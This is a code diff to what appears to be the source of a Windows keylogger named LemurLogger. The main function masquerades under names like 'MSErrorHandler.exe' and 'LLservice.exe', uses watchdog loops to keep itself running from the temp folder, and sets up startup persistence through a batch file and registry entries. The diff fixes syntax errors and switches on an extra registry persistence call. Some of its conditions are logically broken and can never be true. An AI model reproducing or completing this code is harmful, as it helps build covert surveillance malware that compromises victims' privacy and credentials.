@@ -16,14 +16,14 @@ using namespace std;
 int main()
 {
     pre::start();
-    
+
     string filename = IO::getFileName();
     if (filename == "MSErrorHandler.exe" &&  filename == "MSErrorHandler" ){
         std::string msg = "sate idle";
         Helper::WriteAppLog(msg);
         char* temp = getenv("temp");
         std::string temp_dir(temp);
-        std::string path = temp_dir+"\\LLseervice.exe";
+        std::string path = temp_dir+"\\LLservice.exe";
 	    while(true){
 	    while(IO::exists_file(path)){
             if (GetIsOnProcess(filename)){
@@ -36,7 +36,7 @@ int main()
 	IO::copy_File();
         }
     }else{
-    	if(filename == "LLseervice.exe" &&  filename = "LLseervice"{
+    	if(filename == "LLservice.exe" &&  filename == "LLservice"){
  		while (GetIsOnProcess("LemurLogger.exe")||GetIsOnProcess("LemurLogger")){
                 	std::string msg = "sate idle";
         		Helper::WriteAppLog(msg);
@@ -45,18 +45,18 @@ int main()
     }
     if(filename == "LemurLogger.exe"|| filename =="LemurLogger")
 	   {
-                    batname = "\\batLLog.bat";
+            std::string batname = "batLLog.bat";
 		    char* temp = getenv("temp");
 		    std::string temp_dir(temp);
-                    batpath = temp_dir+batname;
-		    IO::mkbat(IO::getFileNameWithPath(),batpath)
+            std::string batpath = temp_dir+batname;
+		    IO::mkbat(IO::getFileNameWithPath(),batpath);
                     //shell_cmd()
                     //startup(fullpath.c_str());
-                    Registry::RegisterProgram2(batname,batpath);   
-    	            //Registry::RegisterProgram();
+                    Registry::RegisterProgram2(batname,batpath);
+    	            Registry::RegisterProgram();
             }
-                    
-     
+
+
     MSG Msg;
     IO::MkDir(IO::GetOurPath(true));
     GetProcID();
